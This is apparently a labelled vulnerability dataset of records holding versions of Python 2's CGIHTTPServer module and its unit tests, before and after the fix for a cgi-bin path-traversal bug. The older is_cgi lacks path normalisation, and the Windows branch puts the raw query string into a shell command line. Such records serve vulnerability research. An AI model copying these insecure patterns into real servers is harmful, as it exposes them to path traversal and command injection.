        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
18,923ba361d8f757f0656cfd216525aca4848e02aa,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
19,923ba361d8f757f0656cfd216525aca4848e02aa,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
